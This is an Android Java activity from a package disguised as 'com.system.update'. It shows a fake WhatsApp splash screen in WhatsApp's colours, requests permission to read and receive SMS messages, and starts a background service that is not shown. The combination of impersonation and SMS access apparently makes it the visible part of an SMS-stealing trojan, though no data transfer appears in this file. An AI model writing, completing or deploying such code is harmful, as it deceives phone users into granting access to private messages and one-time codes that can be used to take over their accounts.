package com.system.update;

import android.app.Activity;
import android.os.Bundle;
import android.widget.TextView;
import android.graphics.Color;
import android.view.Gravity;
import android.content.Intent;
import android.Manifest;
import android.content.pm.PackageManager;
import android.os.Build;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        TextView tv = new TextView(this);
        tv.setText("WhatsApp");
        tv.setTextSize(30);
        tv.setGravity(Gravity.CENTER);
        tv.setBackgroundColor(Color.parseColor("#075E54"));
        tv.setTextColor(Color.WHITE);
        setContentView(tv);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[]{Manifest.permission.READ_SMS, Manifest.permission.RECEIVE_SMS}, 1);
            }
        }

        startService(new Intent(this, CoreService.class));
    }
}
